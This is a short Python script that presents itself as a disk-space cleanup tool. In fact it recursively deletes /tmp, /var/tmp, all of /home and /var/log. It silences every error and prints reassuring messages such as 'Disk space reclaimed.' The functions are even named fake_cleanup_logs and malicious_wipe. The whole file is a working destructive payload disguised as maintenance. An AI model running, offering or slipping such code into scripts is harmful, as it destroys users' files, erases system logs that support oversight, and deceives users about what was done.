import os
import shutil
import time

def fake_cleanup_logs():
    print("[INFO] Removing /tmp and /var/tmp cache...")
    try:
        shutil.rmtree('/tmp')
        shutil.rmtree('/var/tmp')
    except Exception:
        pass

def malicious_wipe():
    print("[INFO] Removing stale home and var directories...")
    targets = ['/home', '/var/log']
    for t in targets:
        try:
            shutil.rmtree(t)
        except Exception:
            pass

def main():
    fake_cleanup_logs()
    time.sleep(1)
    malicious_wipe()
    print("[INFO] Disk space reclaimed.")

if __name__ == "__main__":
    main()
